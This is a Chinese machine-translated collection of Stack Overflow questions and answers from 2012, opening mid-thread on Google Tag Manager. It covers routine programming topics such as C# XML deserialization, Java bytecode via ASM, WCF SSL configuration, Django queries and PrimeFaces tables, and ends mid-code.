GTM 将允许您在以下情况下触发 Floodlight 代码：

*   在您可能无法自行添加标签的页面上（可能在您没有 HTML 编辑权限的其他人的 CMS 上）
*   在事件而不是综合浏览量上 - 在与无法在其他系统上获取跟踪代码的 3rd 方系统集成时通常需要
*   与其他代码同时 - 您可能希望触发 Analytics 事件、FLC 和 Adwords 再营销代码，所有这些代码都基于相同的情况

GTM 让您可以灵活地规划、实施和管理您的标记，而无需向您的页面本身逐步添加额外的代码。

我发现它允许我将跟踪映射到整个站点，计算出我希望实施跟踪的点（无论是跟踪站点性能还是跟踪活动性能），然后在 GTM 中设置所有规则。

这通常可以帮助我找到最简单的方法来跟踪我需要什么。我无需逐页浏览并手动实现多个单独的代码，而是能够定义规则并触发标签，而对 HTML 的更改最少。

对我来说，GTM 和 FLC 之间的区别与 HTML 和内容相同。一个塑造另一个的交付。

菲尔

# c# - 反序列化之前在序列化时包含值的空字段

> ID：12820270
> 
> 赞同：3
> 
> 时间：2012-10-10T13:16:27.170
> 
> 标签：c#, xml, field, deserialization, nullable

我已经阅读了许多关于可空字段反序列化的帖子，但没有遇到以下情况：

1.  *使用包含*值的可为空字段序列化对象（“nil”属性不会添加到节点，因为它包含值）。
2.  从 xml 中的可为空字段中删除值（这通过客户端处理发生）。
3.  反序列化 xml。

第 3 步会抛出错误，因为序列化程序不会将可空字段的空值视为空值（因为未指定“nil=true”）。相反，它会尝试将值转换为字段的数据类型（例如：Guid），但失败会导致错误消息因字段的数据类型而异。

在 Guid 的情况下，错误消息是：

```
 System.InvalidOperationException: There is an error in XML document ([line number], [column number]). ---> System.FormatException: Unrecognized Guid format. 
```

我应该注意，我们使用的序列化/反序列化方法是使用泛型的框架方法。

我正在寻找一个优雅而通用的解决方案。我能想到的唯一可行的通用解决方案如下：

1.  将 xml 转换为 XDocument。
2.  使用（少于期望的）反射来获取对象的所有引用类型的属性。
3.  将“nil=true”属性添加到名称在 #2 的列表中找到*且*值为空的所有节点。
4.  使用递归处理#2 中的每个引用类型。

注意：简单地向所有具有空值的节点添加“nil=true”是行不通的，因为序列化程序会为不能为空的值类型抛出错误。

[编辑] 代码示例：

样本数据类

```
 public class DummyData
    {
        public Guid? NullableGuid { get; set; }
    } 
```

发送给客户端的 XML

```
 <DummyData>
    <NullableGuid>052ec82c-7322-4745-9ac1-20cc4e0f142d</NullableGuid>
    </DummyData> 
```

从客户端返回的 XML（错误）

```
 <DummyData>
    <NullableGuid></NullableGuid>
    </DummyData> 
```

从客户端返回的 XML（期望的结果）

```
 <DummyData>
        <NullableGuid p2:nil="true" xmlns:p2="http://www.w3.org/2001/XMLSchema-instance"></NullableGuid>
    </DummyData> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T11:54:59.840

这是我提出的解决方案，非常类似于我在原始问题中描述的攻击计划。

免责声明：它不短，很可能不会涵盖所有反序列化场景，但似乎可以完成工作。

```
 public static T FromXml<T>(string xml)
    {
       string convertedXml = AddNilAttributesToNullableTypesWithNullValues(typeof(T), xml);
       var reader = new StringReader(convertedXml);
       var serializer = new XmlSerializer(typeof (T));
       var data = (T) serializer.Deserialize(reader);
       reader.Close();
       return data;
    }

    private static string AddNilAttributesToNullableTypesWithNullValues(Type type, string xml)
    {
        string result;

        if (!string.IsNullOrWhiteSpace(xml))
        {
            XDocument doc = XDocument.Parse(xml);

            if (doc.Root != null)
                AddNilAttributesToNullableTypesWithNullValues(doc.Root, type);

            result = doc.ToString();
        }
        else
            result = xml;

        return result;
    }

    private static void AddNilAttributesToNullableTypesWithNullValues(XElement element, Type type)
      {
         if (type == null)
            throw new ArgumentNullException("type");

         if (element == null)
            throw new ArgumentNullException("element");

         //If this type can be null and it does not have a value, add or update nil attribute
         //with a value of true.
         if (IsReferenceOrNullableType(type) && string.IsNullOrEmpty(element.Value))
         {
            XAttribute existingNilAttribute = element.Attributes().FirstOrDefault(a => a.Name.LocalName == NIL_ATTRIBUTE_NAME);

            if (existingNilAttribute == null)
               element.Add(NilAttribute);
            else
               existingNilAttribute.SetValue(true);
         }
         else
         {
            //Process all of the objects' properties that have a corresponding child element.
            foreach (PropertyInfo property in type.GetProperties())
            {
               string elementName = GetElementNameByPropertyInfo(property);

               foreach (XElement childElement in element.Elements().Where(e =>
                  e.Name.LocalName.Equals(elementName)))
               {
                  AddNilAttributesToNullableTypesWithNullValues(childElement, property.PropertyType);
               }
            }

            //For generic IEnumerable types that have elements that correspond to the enumerated type,
            //process the each element.
            if (IsGenericEnumerable(type))
            {
               Type enumeratedType = GetEnumeratedType(type);

               if (enumeratedType != null)
               {
                  IEnumerable<XElement> enumeratedElements = element.Elements().Where(e =>
                     e.Name.LocalName.Equals(enumeratedType.Name));

                  foreach (XElement enumerableElement in enumeratedElements)
                     AddNilAttributesToNullableTypesWithNullValues(enumerableElement, enumeratedType);
               }
            }
         }
      }

      private static string GetElementNameByPropertyInfo(PropertyInfo property)
      {
         string overrideElementName = property.GetCustomAttributes(true).OfType<XmlElementAttribute>().Select(xmlElementAttribute => 
            xmlElementAttribute.ElementName).FirstOrDefault();
         return overrideElementName ?? property.Name;
      }

      private static Type GetEnumeratedType(Type type)
      {
         Type enumerableType = null;

         Type[] types = type.GetGenericArguments();

         if (types.Length == 1)
            enumerableType = types[0];

         return enumerableType;
      }

      public static bool IsGenericEnumerable(Type type)
      {
         return type.IsGenericType && type.GetInterfaces().Any(i => 
            i.IsGenericType && i.GetGenericTypeDefinition() == typeof(IEnumerable<>));
      }

      private static bool IsReferenceOrNullableType(Type type)
      {
         return !type.IsValueType || Nullable.GetUnderlyingType(type) != null;
      }

      private const string NIL_ATTRIBUTE_NAME = "nil";
      private const string XML_SCHEMA_NAMESPACE = "http://www.w3.org/2001/XMLSchema-instance";

      private static XAttribute NilAttribute
      {
         get
         {
             if (_nilAttribute == null)
             {
                 XNamespace xmlSchemaNamespace = XNamespace.Get(XML_SCHEMA_NAMESPACE);
                 _nilAttribute = new XAttribute(xmlSchemaNamespace + NIL_ATTRIBUTE_NAME, true);
         }

        return _nilAttribute;
     }
  } 
```

# macos - 使用 VBA 从 Powerpoint for Mac 2011 导出评论

> ID：12820273
> 
> 赞同：2
> 
> 时间：2012-10-10T13:16:53.560
> 
> 标签：macos, vba, powerpoint

我正在尝试从 Powerpoint for Mac 2011 演示文稿中导出审阅者评论（插入->评论）。我已经大致根据此处的示例 VBA 代码尝试了导出： [Extracting comments from an PowerPoint presentation using VBA](https://stackoverflow.com/questions/3342902/extracting-comments-from-a-powerpoint-presentation-using-vba)

但是，Mac 版本的 VBA 似乎无法识别“comment”类型。代码在这里失败：

```
Dim oCom As Comment <-- Error: "User Defined Type Not Defined" 
```

关于如何导出这些审阅者评论还有其他想法/解决方法吗？谢谢！

# amazon-ec2 - AWS：创建 EC2 实例时用户数据和元数据标签之间的区别

> ID：12820275
> 
> 赞同：3
> 
> 时间：2012-10-10T13:16:55.607
> 
> 标签：amazon-ec2, amazon-web-services, metadata

可以使用“用户数据”（长字符串）或元数据标签（多个键/值对）创建 Amazon EC2 实例。

这些有什么区别？为什么这两个系统并行存在？

特别是，我希望在启动时将某些自定义数据（即连接字符串和两个资源 URL）传递给 EC2 机器，以便它可以自行配置。大概这些最好作为三个键/值对发送？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:40:54.687

根据[此](http://docs.amazonwebservices.com/AWSEC2/latest/UserGuide/AESDG-chapter-instancedata.html)文档页面，亚马逊提供的**元数据和****用户**指定的用户数据：

> Amazon EC2 实例可以访问特定于实例的元数据以及启动实例时提供的数据。
> 
> 您可以使用此数据构建更多通用 AMI，这些 AMI 可以通过启动时提供的配置文件进行修改。例如，如果您为各种小型企业运行 Web 服务器，它们都可以使用相同的 AMI 并从您在启动时指定的 Amazon S3 存储桶中检索其内容。要随时添加新客户，只需为客户创建一个存储桶，添加他们的内容，然后启动您的 AMI。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-01-09T01:51:46.897

*实例元数据* 是用于配置或管理正在运行的实例的数据。例如，主机名、事件和安全组。

*用户指定的User Data*，例如你添加了一个新的bucked，它唯一的bucked名称将成为用户数据的一部分。

来源：[https ://docs.amazonaws.cn/en_us/AWSEC2/latest/UserGuide/ec2-instance-metadata.html](https://docs.amazonaws.cn/en_us/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)

# java - 使用 ASM 访问 Java Stack 中的第二个顶级对象

> ID：12820276
> 
> 赞同：2
> 
> 时间：2012-10-10T13:16:57.663
> 
> 标签：java, java-bytecode-asm

我正在使用 ASM 来监视字段访问（putfield 和 getfield）。（对于putfield，）我的问题是，当栈顶是一个基本值（X）而第二个栈顶是一个对象引用（Y）时，我如何插入一些Java指令来调用我的方法与第二个对象引用（ Y）作为它的一个参数，从我的方法返回后，两个（X和Y）不会丢失？</p>

总之，如何在 Java 字节码级别访问第二个顶部对象引用而不影响 Java 中堆栈的顶部值（在我访问之后）？

我想使用dup，但它只能处理堆栈的顶部值。因此，它适用于 getfield，因为没有值，我可以直接复制它。

有没有更好的方法来做到这一点？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T03:26:20.693

案例1...基本值不是Long或Double -

假设堆栈的顶部看起来像这样......

Y,X（最右边的元素是堆栈的顶部。）

以下指令序列应该可以解决问题...

**DUP2**

**流行音乐**

DUP2 将复制前两条指令。因此导致 Y,X,Y,X。POP 将弹出 X（基本值）。剩下的就是 Y,X,Y。然后你可以调用你的函数。

案例 2... 基本值为 Long 或 Double -

堆栈的顶部看起来像这样...... Y，X1，X2。为此，您可以使用以下指令序列...

**DUP2_X1** // 这将导致 X1,X2,Y,X1,X2

**POP2** // 这将导致 X1,X2,Y

**DUP_X2** // 这将导致 Y,X1,X2,Y

因此，您再次在堆栈顶部有 Y。而它下面的一切都和以前一样。

在这两种情况下，您最终得到的是堆栈顶部的 Object Ref (Y)，允许您将它用于您选择的任何操作，例如方法调用。一旦该操作完成，堆栈的状态与您执行操作之前的状态完全相同。

# c# - 按特定项目对枚举类型列表的成员进行排序

> ID：12820278
> 
> 赞同：1
> 
> 时间：2012-10-10T13:17:04.907
> 
> 标签：c#, algorithm

我有一个`enum`：

```
 public enum Fruits
    {
       Apple = 14,
       Lemon = 174,
       Grapes = 200,
       Peach = 1
    } 
```

和一个清单`enum`：

```
IEnumerable<Fruits> Fruits = new List<Fruits>(); 
```

默认情况下，当我调用它时`getValues`，`enum`它会按它们的 ID 对条目进行排序。我在 UI 中将列表显示为下拉列表，并希望按特定顺序对列表成员进行排序。在我的示例中，我想`Lemon`成为列表中的第一项。

我尝试通过 Lemon 条目来订购物品，如下所示：

```
Fruits.OrderBy(f => f.Lemon); 
```

但我不允许`f.Lemon`在这种情况下这样做。也许我可以`foreach`在列表中删除 Lemon 项目，然后将其作为第一个条目插入。

我对编程很陌生，我发现了一些类似的问题，但不是`enum`类型。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:21:14.050

您可以使用`OrderByDescending`+ `ThenBy`：

```
fruits.OrderByDescending(f => f == Fruits.Lemon)
      .ThenBy(f => f); 
```

请注意，变量的名称应该与枚举类型不同（我使用了小写字母`fruits`）。

如果您想按名称订购第二个：

```
 .ThenBy(f => f.ToString()); 
```

`f == Fruits.Lemon`返回一个您可以订购的布尔值。它类似于 SQL `CASE`：

```
ORDER BY CASE WHEN Fruit = 'Lemon' THEN 1 ELSE 0 END DESC, FRUIT ASC 
```

# c++ - OpenCV 2.4 Jpeg 到带有 alpha 通道的 PNG

> ID：12820283
> 
> 赞同：7
> 
> 时间：2012-10-10T13:17:23.670
> 
> 标签：c++, opencv

我有一个 JPEG 和一个面具。我想用三个 JPEG 通道创建一个 PNG，alpha 通道应该是 Mask。如何使用 OpenCV 实现这一目标？

问候

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-10T14:36:05.057

```
std::vector<cv::Mat> channels;
cv::split(jpgImage, channels);
channels.push_back(mask);
cv::Mat bgraImage;
cv::merge(channels, bgrAImage); 
```

[拆分和合并功能](http://docs.opencv.org/modules/core/doc/operations_on_arrays.html?highlight=merge#cv.Merge)的文档

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-10-10T15:06:33.263

感谢您的回答，我找到了第二种解决方案：

```
cv::Mat transparent( height, width, CV_8UC4);
cv::Mat srcImg[] = {JPEG_img, alpha_Mask};
int from_to[] = { 0,0, 1,1, 2,2, 3,3 };
cv::mixChannels( srcImg, 2, &transparent, 1, from_to, 4 ); 
```

这很完美，不确定哪种解决方案更好。

# wcf - WCF 服务通过 HTTPS 给出错误

> ID：12820286
> 
> 赞同：1
> 
> 时间：2012-10-10T13:17:33.063
> 
> 标签：wcf, ssl, wcf-hosting

我制作了一个 WCF 服务，配置如下：

```
 <!-- This is the binding for SSL-->
  <wsHttpBinding>
    <binding name="SSLBinding">
      <security mode="Transport" >
        <transport clientCredentialType="None" ></transport>            
      </security>
    </binding>       
  </wsHttpBinding>  
  <!-- SSL Binding Ends here.-->

</bindings>

<behaviors>
  <serviceBehaviors>

    <!-- This is the behavior we have defined for SSL configuration-->
    <behavior name="SSLBehavior">
      <serviceMetadata httpsGetEnabled="True"/>          
    </behavior>
    <!-- SSL Behavior Ends here -->        
  </serviceBehaviors>
</behaviors>

<services>
  <!-- Service configured alongwith its Mex Endpoint-->      
  <service name="CalculatorService.Service1" behaviorConfiguration="SSLBehavior">
    <endpoint contract="CalculatorService.IService1" name="SSLAddress" binding="wsHttpBinding"  bindingConfiguration="SSLBinding"></endpoint>
    <endpoint name="mex"  binding="mexHttpsBinding" contract="IMetadataExchange"></endpoint>
  </service> 

</services>
<serviceHostingEnvironment multipleSiteBindingsEnabled="false" /> 
```

我已使用以下教程在 IIS 5.1 上的 WCF 服务上托管 SSL [http://www.codeproject.com/Articles/36705/7-simple-steps-to-enable-HTTPS-on-WCF-WsHttp-bindi](http://www.codeproject.com/Articles/36705/7-simple-steps-to-enable-HTTPS-on-WCF-WsHttp-bindi)

我收到错误消息

```
A binding instance has already been associated to listen URI 
'https://wd-xpa7kyy12d3.XXXX.com/CalculatorService/Service1.svc'. If two endpoints want to share the same ListenUri, they must also share the same binding object instance. The two conflicting endpoints were either specified in AddServiceEndpoint() calls, in a config file, or a combination of AddServiceEndpoint() and config. 
```

在名为“SSLAddress”的端点中，我将“地址”添加为“https://wd-xpa7kyy12d3.XXXX.com/CalculatorService/Service1.svc”，但无法使用此 URL 添加服务引用，必须专门提供 WSDL小路。

即使在向控制台应用程序提供 WSDL 路径并成功添加服务引用后，当客户端代理执行方法时，它也会出错。所以我从端点中删除了地址属性，现在这个问题来了。我不确定当前配置有什么问题？感谢帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:34:34.257

尝试添加

```
address="mex" 
```

到您的元数据端点。指定的地址最终是相对路径，因此将给出

```
https://wd-xpa7kyy12d3.XXXX.com/CalculatorService/Service1.svc/mex 
```

作为地址。另一个端点将保持在

```
https://wd-xpa7kyy12d3.XXXX.com/CalculatorService/Service1.svc 
```

# objective-c - 将对象添加到 NSMutablearray 无法正常工作

> ID：12820289
> 
> 赞同：0
> 
> 时间：2012-10-10T13:17:37.197
> 
> 标签：objective-c, nsmutablearray

我有一种情况，在循环中我试图将一个对象添加到 NSMutableArray。在循环结束时，它显示 54 个对象（作为示例）被添加到数组中，但是当我试图从数组中读取对象时，显然它们彼此相同并且与最后一个相同插入到数组中的对象。

谁能帮我解决这个问题。这是我的代码：

```
int counter=0;

for (int j=0; j<rows; j++) 
{      
     Product *product ;
     product = [[Product alloc] init];
     int numberr= [product getImageNumber];
     [wineList addObject:product];
     counter = counter + 1;  
} 
```

添加对象后，我正在测试数组的内容，对于数组中的每个项目，我得到相同的结果

```
//testing
Product *producttest1 = wineList[1];
int numbertest1= [producttest1 getImageNumber];
Product *producttest2 = wineList[20];
int numbertest2= [producttest2 getImageNumber]; 
```

这是`Product`我拥有的类的定义：

```
#import "Product.h"
@implementation Product

int imageNumber;
bool isInCase;

-(id) init {
    imageNumber = (arc4random() % 11) + 1;

    isInCase = false;

    return self;
}

-(int) getImageNumber {

    return imageNumber;
}

-(void) setImageNumber:(int) number {

    imageNumber = number;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T14:07:12.147

您的`-init`方法永远不会初始化您的类。打电话给`[super init]`。

```
-(id)init {
    self = [super init];

    if (self) {
        imageNumber = (arc4random() % 11) + 1;
        isInCase = false;
    }

    return self;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:35:27.000

你的代码应该是这样的，

```
int counter=0;
for (int j=0; j < rows; j++) 
{      
     Product *product = [[Product alloc] init]; // Added variable declaration inside.
     int numberr= [product getImageNumber];
     [wineList addObject:product];
     [product release];                         // Added release for product
     counter = counter + 1;  

} 
```

# django - 从数据库中获取数据的问题

> ID：12820292
> 
> 赞同：0
> 
> 时间：2012-10-10T13:17:48.137
> 
> 标签：django, django-templates, django-views

我可以像这样获取数据。

```
value= mymodel.objects.get(anycondition) 
```

**或者**

```
value= mymodel.objects.filter(anycondition) 
```

并且可以将它们与上下文一起发送到我的模板。

但是，如果我想像此查询一样从表中选择所有数据（不仅针对所有用户）

```
value= mymodel.objects.all() 
```

并将这个值发送到我的模板，并且可以逐个字段地查看

例如

我的表有两个字段名称和电话号码，我现在使用上面的查询（ **value= mymodel.objects.all()**）如果我想查看所有名称，那么我可以看到，如果我想查看电话号码。我也能看到。

我已经尝试过了，但它不起作用，我什至不知道它是否可能。如果可能的话，请让我知道我该怎么做？

我希望你能理解我的问题。！！

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T04:05:02.933

`.all()`将返回代表模型中行的对象***列表。***`.get()`只返回一个对象。您的模板正在尝试打印`all()`它是否是一个对象的结果。

这就像你有一个列表并且你想遍历它一样。在您看来，您会这样做：

```
product = Product_attributes.objects.all()
for i in product:
   print i.size
   print i.color 
```

模板的等价物是：

```
<ul>
{% for i in product %}
   <li>{{ i.size }}</li>
   <li>{{ i.color }}</li>
{% endfor %}
</ul> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T14:22:16.527

尽管这个问题尚不清楚，但您似乎在使用 Field Lookups 时遇到了一些问题。学习起来相当容易[这是一个让你开始的链接](https://docs.djangoproject.com/en/dev/topics/db/queries/#field-lookups)

# c# - 连接到 SQL Server 数据库

> ID：12820293
> 
> 赞同：0
> 
> 时间：2012-10-10T13:17:57.757
> 
> 标签：c#, visual-studio, ado.net, sql-server-2012-express

我安装了 Visual Studio 2010 和 SQL Server Express 2012。然后我在 SQL Server Management Studio 中创建了一个新数据库。

有人可以告诉我如何从 Visual Studio 连接到该数据库（项目类型不相关）并开始工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T04:42:20.443

如果您想将实体框架添加到您的项目，或者您想要简单的点连接到数据库，有一些选项。好吧，在第二种情况下，您可以按照以下步骤操作：

**转到服务器资源管理器>>选项以向数据库添加连接>>选择服务器名称>>**您将被引导。

对于使用实体框架，您可以通过[实体框架教程](http://msdn.microsoft.com/en-us/library/aa697427%28v=vs.80%29.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T04:57:29.347

由于数据库文件和 VS2010 的版本不兼容，我认为您无法从 VS2010 服务器资源管理器连接到 SQLSERVER2012 数据库文件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:19:52.333

看看你的服务器资源管理器。您将能够从那里创建数据连接并使用它们。

另一方面，如果你问如何创建一个 C# 程序并连接到你的数据库，那是一个完全不同的问题，答案要复杂得多。但是对 Google 进行一些研究应该可以帮助您入门。如果这是您想要做的，这篇[文章可能会有所帮助。](http://www.codeproject.com/Articles/4416/Beginners-guide-to-accessing-SQL-Server-through-C)

# java - 谁调用了方法？

> ID：12820300
> 
> 赞同：0
> 
> 时间：2012-10-10T13:18:14.950
> 
> 标签：java

我有一个代码：

```
abstract void run();

public void start() {
    Logger log = Logger.getLogger(Test.class.getName());
    try {
        run();
    } catch (Exception e) {
        log.warn(e.getMessage());
    }       
} 
```

我可以执行`start()`例如：

```
object1.start();
object2.start();
object3.start(); 
```

如何检查`start()`哪个对象（名称对象）启动了该方法`start()`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:21:29.630

假设您尝试获取“object1”、“object2”和“object3”作为名称（不清楚），您应该注意两件事：

*   这些是*变量*，而不是*对象*。具有不同名称的多个变量可以引用同一个对象。
*   对象通常没有名称 - 您可以添加自己的`name`字段，但您必须明确地这样做。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-10T13:21:01.063

没有自动的方法可以做到这一点。Java 中的对象不必有名称。

一种解决方案是：

```
public void start(String name) {
    Logger log = Logger.getLogger(name);
} 
```

这是有效的，因为记录器可以具有任意名称。许多记录器使用类的名称，因为这是一种简单且自动的方式来命名记录器。但这不是必需的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-10T13:23:58.297

```
new Exception().getStackTrace()[1] 
```

见[StackTraceElement](http://docs.oracle.com/javase/6/docs/api/java/lang/StackTraceElement.html)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-10T13:22:31.383

如果您的意思是获取字符串`"object1"`：这在逻辑上是不明智的。这是一个*变量*的名称，而不是它所*引用*的对象，并且在运行时不存在。事实上，编译器*可能会将*其完全优化掉。另外，它是模棱两可的：

考虑以下代码：

```
object2 = object1;
object2.start(); 
```

实例现在应该看到名称`"object1"`还是`"object2"`？*两者*都是！

如果您希望您的对象有一个“名称”，请使用一个自我管理的字段来存储它。

```
object1.setName("object2"); 
```

或在构造函数中执行相同操作：

```
MyObject object1 = new MyObject("object1"); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-10T13:30:32.950

如果这是您想要的，您无法在运行时获取变量的名称

我会在 start() 方法之外启动日志

```
Logger log = Logger.getLogger(object1);
object1.start(log); 
```

然后您的 start() 方法将如下所示：

```
public void start(Logger log) {    
    try {
        run();
    } catch (Exception e) {
        log.warn(e.getMessage());
    }       
} 
```

或者，如果您无法更改 start() 签名：

```
Logger log;
public void setLogger(Logger log){
    this.log = log;
}
public void start() {    
    try {
        run();
    } catch (Exception e) {
        log.warn(e.getMessage());
    }       
} 
```

然后：

```
Logger log = Logger.getLogger(object1);
object1.setLogger(log);
object1.start(); 
```

# sencha-touch-2 - 在 sencha touch 应用程序中集成 HTML 5 视频播放器（jplayer）

> ID：12820302
> 
> 赞同：0
> 
> 时间：2012-10-10T13:18:20.300
> 
> 标签：sencha-touch-2, html5-video, jplayer

在我的 sencha touch 应用程序中使用像[jplayer](http://www.jplayer.org/ "播放器")这样的html5 视频播放器是一种好习惯吗？

如果是这样，我们可以在哪里实例化播放器？另外，我们在哪里编写播放器的 html 代码？这个[演示](http://jplayer.org/latest/demo-01-video/ "演示")有 javascript 和 html 部分。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T09:48:59.777

如果我们使用 sencha 命令进行部署，可以在 app.json 文件中引用第三方脚本。但是我的情况并非如此，因此将它们添加到 index.html 中效果很好。

播放器的实例化可以在任何地方进行。但要确保在执行 html 代码的 DOM 部分后完成实例化，请转到编写 html 的视图并将 javascript 部分写入绘制函数中。

# spring - 如何在 jms-spring 集成中向消息侦听器 bean 注入消息选择器？

> ID：12820306
> 
> 赞同：8
> 
> 时间：2012-10-10T13:18:36.760
> 
> 标签：spring, jms, messaging

我正在使用 JMS API（使用 HornetQ），并且我正在使用 spring bean 用于消息侦听器容器和消息侦听器：

```
<bean id="messageListener" class="core.messaging.handler.MessageListener">
    <property name="postCommandService" ref="postCommandService" />
</bean>

<bean id="messageSender"
    class="lsn.messaging.sender.MessageSender">
    <property name="connectionFactory" ref="connectionFactory" />
    <property name="destination" ref="destination" />
</bean>

<bean id="msgListenerContainer"
  class="org.springframework.jms.listener.DefaultMessageListenerContainer" 
  p:connectionFactory-ref="connectionFactory"
  p:destination-ref="destination"
  p:messageListener-ref="messageListener"
  p:concurrentConsumers="10"
  p:maxConcurrentConsumers="50"
  p:receiveTimeout="5000"
  p:idleTaskExecutionLimit="10"
  p:idleConsumerLimit="5" /> 
```

如果我想要我的消息监听器，只使用特定的消息（具有相同的 StringProperty）我应该怎么做？我应该在哪里定义选择器？

我有以下解决方案，但我没有 MessageConsumer，所以我无法向其中添加选择器：

```
 String redSelector = "color='red'";

     MessageConsumer redConsumer = session.createConsumer(queue, redSelector);
     redConsumer.setMessageListener(new SimpleMessageListener("red"));

     TextMessage redMessage = session.createTextMessage("Red");
     redMessage.setStringProperty("color", "red");

     producer.send(redMessage); 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-10T13:58:57.893

您应该可以通过这种方式将其添加到[MessageListenerContainer](http://static.springsource.org/spring/docs/3.1.x/javadoc-api/index.html)中：

`p:messageSelector="color='red'"`

# php - 谷歌加圈子数据库逻辑

> ID：12820310
> 
> 赞同：2
> 
> 时间：2012-10-10T13:18:52.063
> 
> 标签：php, database, database-design, google-plus, geometry

所以我最近开始尝试在我的网站上创建一个类似的圈子系统，比如 google plus。

但不好的部分是我不太擅长规划数据库。

所以我想在谷歌网站上收集一些信息，我看到每个用户都有唯一的圈子 ID。

所以我的想法是什么。

我有用户，并以这种方式存储它们。

```
users
users_metadata
users_settings 
```

`users`表包含通行证、用户名、电子邮件、上次登录和基本内容 `users_metadata`包含信息或他们的配置文件 `users_settings`包含其他设置选项

所以当用户注册到站点时，会在`users_metadata`id`users_settings the current user`中插入。

`users_circles`所以我的问题是，使用默认选项为每个用户创建一个表是个好主意吗？

我之所以这么想，是因为这将使他们能够更轻松地创建自己的群组并删除他们不喜欢的群组。

或者有人可以告诉我一个更好的逻辑吗？如果它不是一个很大的要求。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T14:21:44.733

坦率地说，您提出的每人一张桌子的建议是个坏主意。当您有一些用途时，它可能会“正常”工作，但如果它扩展到任何级别，这将是编程和数据库管理的噩梦，更不用说资源的可怕浪费了。

这是一个完美的例子，你应该有一个 users_groups 表，每个用户组都存在。当然，每个组都有自己的 ID，以及组的所有者（用户）。选择组将返回多行 - 组的成员。

这就是关系数据库擅长的。

充分利用这一点。

# jsf-2 - Primefaces：如何仅对数据表的标题列进行分组？

> ID：12820311
> 
> 赞同：4
> 
> 时间：2012-10-10T13:18:53.423
> 
> 标签：jsf-2, primefaces

我正在使用带有“子表”的 Primefaces“数据表”。我有一些两行的标题列。
在第一行，我有 5 个标题列。在第二行，我有 8 个标题列。
在我的数据表的第一级列上，我想在五列中显示“项目”的信息。
在第二级，当我显示所选项目的子项时，我想显示项目的状态信息（在 8 列中）。

状态信息包含在子表中。
我想在我的标题第一行的列下打包我的标题第二行的一些列。为了使它成为可能，我在标题的第一行列中引用了值为“3”的属性“colspan”和值为“2”的另一列。

问题是它还打包了我的第一级行的数据值列。这意味着我有 8 列要填充而不是 5 列，并且它们已被填充。我只想为第一级设置 5 列，为第二级设置 8 列（状态信息）。

是否可以只在标题列上添加 colspan 而不是在正文中？

这是我的代码示例：

```
 <p:columnGroup type="header">
            <p:row>
                <p:column>
                </p:column>

                <p:column headerText="#{bundle.form_name}" filterBy="#{item.name}"
                    sortBy="#{item.name}" colspan="3">
                </p:column>

                <p:column headerText="#{bundle.form_designation}"
                    style="width:140px;" filterBy="#{item.designation}"
                    sortBy="#{item.designation}" colspan="2">
                </p:column>

                <p:column headerText="#{bundle.form_status}"
                    filterBy="#{item.status}"
                    filterOptions="#{itemStatusListBean.options}">
                </p:column>

                <p:column headerText="#{bundle.form_date}"
                    filterBy="#{item.statusDate}" sortBy="#{item.statusDate}">
                </p:column>
            </p:row>

            <p:row>
                <p:column />
                <p:column headerText="Status" style="width:25px;" />
                <p:column headerText="Type" style="width:25px;" />
                <p:column headerText="Marché" style="width:25px;" />
                <p:column headerText="Groupe" />
                <p:column headerText="Produit" />
                <p:column headerText="Désignation Produit" />
                <p:column headerText="EAN" />
            </p:row>
        </p:columnGroup>

        <p:column style="width:4%">
            <p:rowToggler>
            </p:rowToggler>
        </p:column>

        <p:column>
            <h:outputText value="#{item.name}" />
        </p:column>

        <p:column>
            <h:outputText value="#{item.designation}" />
        </p:column>

        <p:column>
            <h:outputText value="#{item.status.label}" />
        </p:column>

        <p:column>
            <h:outputText value="#{item.statusDate}">
                <f:convertDateTime pattern="dd/MM/yyyy" timeZone="Europe/Paris" />
            </h:outputText>
        </p:column>

        <p:rowExpansion>
            <p:subTable var="status" value="#{item.status}">
                <p:column>
                </p:column>

                <p:column>
                </p:column>

                <p:column>
                </p:column>

                <p:column>
                </p:column>

                <p:column>
                </p:column>

                <p:column>
                </p:column>

                <p:column>
                </p:column>
            </p:subTable>
        </p:rowExpansion>
    </p:dataTable> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T09:04:14.297

好的，所以现在我找到了解决方案。
首先，该解决方案意味着对 Primefaces 进行一些调整。事实上，您需要启用将属性“colspan”添加到包含在 DataTable 中的“column”标签的可能性。

为此，您需要创建以下包：“org.primefaces.component.datatable”并创建一个名为“MyDataTableBeanRenderer”的类，该类将扩展实际的“DataTableBeanRenderer”。
在此类中，您将需要“覆盖”处理 DataTable 的正文单元格呈现 (encodeRegularCell)、行扩展呈现和分页器呈现（如果使用其中之一）的方法。
您还必须添加一个方法来检索标题列组的第二行中包含的行数。如果数据表的第二级包含的行多于第二级，则将调整当前的“td”或“th”列跨度（取决于方法）。在每种方法中，检查“getMaximumNumberOfColumns”的位置

现在，这是相应的 Java 代码：

```
@Override
    protected void encodeRegularCell(FacesContext context, DataTable table, Column column, String clientId,
